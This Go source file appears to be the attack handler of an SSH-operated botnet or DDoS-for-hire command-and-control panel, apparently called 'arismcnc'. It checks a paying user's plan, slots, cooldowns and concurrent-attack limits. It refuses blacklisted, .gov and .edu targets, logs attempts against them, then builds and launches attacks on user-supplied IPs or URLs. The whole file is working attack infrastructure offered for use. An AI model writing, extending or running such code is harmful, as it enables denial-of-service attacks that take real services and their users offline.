package handlers

import (
	"arismcnc/database"
	"arismcnc/managers"
	"arismcnc/utils"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/gliderlabs/ssh"
)

// AttackHandler validates and dispatches attack commands
func AttackHandler(db *database.Database, session ssh.Session, args []string) {
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		log.Printf("failed to load config: %v", err)
		return
	}

	userInfo := db.GetAccountInfo(session.User())
	methods := utils.GetMethodsList()

	// Only process if first arg is a known attack method
	if !managers.Contains(methods, args[0]) {
		return
	}

	brandingData := BuildBrandingData(session, db)

	if len(args) < 4 {
		msg := utils.Branding(session, "invalid-usage", brandingData)
		utils.SendMessage(session, msg+"\u001B[0m", true)
		return
	}

	// Expired account check
	if db.IsAccountExpired(session.User()) {
		theme := utils.GetTheme()
		utils.SendMessage(session, theme.Colors.Error+"Your plan has expired."+theme.Colors.Reset, true)
		return
	}

	// Attacks disabled check
	if !config.Attacks_enabled && userInfo.Admin != 1 {
		msg := utils.Branding(session, "attacks-disabled", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Validate target format
	if len(args) > 1 && !isValidTarget(args[1]) {
		msg := utils.Branding(session, "invalid-usage", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Blacklist check
	if isBlacklisted(db, session, args) {
		lm, err := managers.NewLogManager("./assets/logs/logs.json")
		if err != nil {
			log.Printf("Error initializing LogManager: %v", err)
			return
		}
		defer lm.Close()

		lm.Log("User tried to attack blocked target (C2)!\nUsername: " + session.User() + "\nTarget: " + args[1] + "\nPort: " + args[2] + "\nTime: " + args[3] + "\nMethod: " + args[0] + "\n----------------------")
		msg := utils.Branding(session, "blocked-target", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Spam protection
	if userInfo.BypassSpam != 1 && db.IsSpamming(session.User()) {
		msg := utils.Branding(session, "spam-protection", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Slot validation
	if !validateSlots(db, session, config, args[0], userInfo) {
		return
	}

	// Cooldown checks
	if !checkCooldowns(db, session, config, userInfo) {
		return
	}

	// Concurrents limit
	if db.GetUserCurrentAttacksCount(session.User()) >= userInfo.Concurrents {
		msg := utils.Branding(session, "concurrents-limit", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Power saving: check if target already under attack
	if userInfo.PowerSaving != 1 {
		if db.IsTargetCurrentlyUnderAttack(args[1]) {
			msg := utils.Branding(session, "target-under-attack", brandingData)
			utils.SendMessage(session, msg, true)
			return
		}
	}

	// Build and execute attack
	vip := userInfo.Vip == 1
	private := userInfo.Private == 1
	admin := userInfo.Admin == 1
	maxtime := userInfo.Maxtime

	atk, err := managers.NewAttack(session, args, vip, private, admin, maxtime, db)
	if err != nil {
		session.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		return
	}

	isError, errMsg, msg := atk.Build(session, db, config)
	if isError {
		theme := utils.GetTheme()
		utils.SendMessage(session, fmt.Sprintf("%s%s%s", theme.Colors.Error, errMsg.Error(), theme.Colors.Reset), true)
	} else {
		utils.SendMessage(session, msg, true)
		db.LogAttack(session.User(), atk.Target, atk.Port, int(atk.Duration), atk.MethodName)
	}
}

func isValidTarget(target string) bool {
	return strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") || managers.ValidIP4(target)
}

func isBlacklisted(db *database.Database, session ssh.Session, args []string) bool {
	blockedIPS := utils.ReadBlacklistedIPs("assets/blacklists/list.json")
	for _, blockedIP := range blockedIPS {
		if args[1] == blockedIP || (strings.Contains(blockedIP, ".gov") && strings.Contains(args[1], ".gov")) || (strings.Contains(blockedIP, ".edu") && strings.Contains(args[1], ".edu")) {
			return true
		}
	}
	return false
}

func validateSlots(db *database.Database, session ssh.Session, config *utils.Config, method string, userInfo database.AccountInfo) bool {
	theme := utils.GetTheme()
	currentAttacks := db.GetCurrentAttacksLength()

	methodConfig, err := utils.GetMethodConfig(method)
	if err != nil {
		utils.SendMessage(session, theme.Colors.Error+"Method configuration not found"+theme.Colors.Reset, true)
		return false
	}

	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
		utils.SendMessage(session, theme.Colors.Error+"All slots of method `"+methodConfig.Method+"` ("+strconv.Itoa(methodConfig.Slots)+") are currently in use!"+theme.Colors.Reset, true)
		return false
	}

	if currentAttacks > config.Global_slots {
		utils.SendMessage(session, theme.Colors.Error+"Global network slots ("+strconv.Itoa(config.Global_slots)+") are currently in use"+theme.Colors.Reset, true)
		return false
	}
	return true
}

func checkCooldowns(db *database.Database, session ssh.Session, config *utils.Config, userInfo database.AccountInfo) bool {
	if userInfo.Admin != 1 {
		if cooldown := db.HowLongOnCooldown(session.User(), userInfo.Cooldown); cooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on cooldown. (%d seconds left)\u001B[0m", cooldown), true)
			return false
		}
		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on global cooldown. (%d seconds left)\u001B[0m", globalCooldown), true)
			return false
		}
	}
	return true
}

// Ensure os import is used (for log manager)
var _ = os.Exit
